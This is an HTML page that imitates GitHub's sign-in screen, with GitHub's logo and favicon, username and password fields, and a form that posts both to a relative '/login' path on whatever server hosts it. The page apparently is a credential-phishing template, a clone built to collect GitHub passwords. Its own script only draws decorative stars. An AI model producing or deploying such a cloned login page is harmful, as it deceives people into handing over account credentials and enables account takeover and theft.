<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Sign in to GitHub</title>
<link rel="icon" href="https://github.githubassets.com/favicons/favicon.svg">
<style>
*{margin:0;padding:0;box-sizing:border-box}
@keyframes fadeInUp{from{opacity:0;transform:translateY(30px)}to{opacity:1;transform:translateY(0)}}
@keyframes fadeIn{from{opacity:0}to{opacity:1}}
@keyframes stars{0%{opacity:0.3}50%{opacity:1}100%{opacity:0.3}}
@keyframes glow{0%,100%{box-shadow:0 0 5px rgba(31,111,235,0.3)}50%{box-shadow:0 0 20px rgba(31,111,235,0.5)}}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#0d1117;display:flex;flex-direction:column;align-items:center;min-height:100vh;padding:40px 20px;position:relative;overflow:hidden}
body::before{content:'';position:absolute;top:0;left:0;right:0;bottom:0;background:radial-gradient(ellipse at 50% 0%,rgba(31,111,235,0.08) 0%,transparent 70%);pointer-events:none}
.stars{position:absolute;top:0;left:0;right:0;bottom:0;overflow:hidden;pointer-events:none}
.star{position:absolute;width:2px;height:2px;background:white;border-radius:50%;animation:stars 3s ease-in-out infinite}
.logo{margin-bottom:24px;animation:fadeInUp 0.6s ease;z-index:1}
.logo svg{width:48px;height:48px;fill:#f0f6fc;filter:drop-shadow(0 0 10px rgba(240,246,252,0.2))}
h1{font-size:24px;font-weight:300;color:#f0f6fc;margin-bottom:20px;text-align:center;animation:fadeInUp 0.6s ease 0.1s both;z-index:1}
.card{background:#161b22;border:1px solid #30363d;border-radius:12px;padding:24px;width:308px;z-index:1;animation:fadeInUp 0.6s ease 0.2s both;transition:border-color 0.3s}
.card:hover{border-color:#484f58}
.card label{display:block;font-size:14px;font-weight:600;color:#f0f6fc;margin-bottom:8px}
.card input{width:100%;padding:10px 12px;background:#0d1117;border:1px solid #30363d;border-radius:6px;color:#f0f6fc;font-size:14px;outline:none;margin-bottom:16px;transition:all 0.3s}
.card input:focus{border-color:#1f6feb;box-shadow:0 0 0 3px rgba(31,111,235,0.3);animation:glow 2s ease infinite}
.signin-btn{width:100%;padding:10px;background:linear-gradient(135deg,#238636,#2ea043);color:white;border:1px solid rgba(240,246,252,0.1);border-radius:6px;font-size:14px;font-weight:500;cursor:pointer;transition:all 0.3s}
.signin-btn:hover{background:linear-gradient(135deg,#2ea043,#3fb950);box-shadow:0 4px 12px rgba(46,160,67,0.3);transform:translateY(-1px)}
.forgot{display:block;text-align:center;color:#58a6ff;font-size:12px;text-decoration:none;margin-top:16px;transition:color 0.2s}
.forgot:hover{color:#79c0ff;text-decoration:underline}
.signup{margin-top:16px;padding:16px;border:1px solid #30363d;border-radius:12px;text-align:center;font-size:14px;color:#8b949e;width:308px;z-index:1;animation:fadeInUp 0.6s ease 0.3s both}
.signup a{color:#58a6ff;text-decoration:none;font-weight:600}
.footer{margin-top:auto;padding:40px 0;text-align:center;font-size:12px;color:#484f58;z-index:1;animation:fadeIn 0.6s ease 0.5s both}
</style>
</head>
<body>
<div class="stars" id="stars"></div>
<script>for(let i=0;i<50;i++){const s=document.createElement('div');s.className='star';s.style.left=Math.random()*100+'%';s.style.top=Math.random()*100+'%';s.style.animationDelay=Math.random()*3+'s';s.style.animationDuration=(2+Math.random()*3)+'s';document.getElementById('stars').appendChild(s)}</script>
<div class="logo">
    <svg viewBox="0 0 16 16"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/></svg>
</div>
<h1>Sign in to GitHub</h1>
<div class="card">
    <form action="/login" method="POST">
        <label>Username or email address</label>
        <input type="text" name="login" required autofocus>
        <label>Password <a href="#" style="color:#58a6ff;font-weight:400;font-size:12px;float:right;text-decoration:none">Forgot password?</a></label>
        <input type="password" name="password" required>
        <button type="submit" class="signin-btn">Sign in</button>
    </form>
</div>
<div class="signup">New to GitHub? <a href="#">Create an account</a>.</div>
<div class="footer"><a href="#" style="color:#484f58;text-decoration:none;margin:0 8px">Terms</a>·<a href="#" style="color:#484f58;text-decoration:none;margin:0 8px">Privacy</a>·<a href="#" style="color:#484f58;text-decoration:none;margin:0 8px">Docs</a><br>© 2024 GitHub, Inc.</div>
</body>
</html>
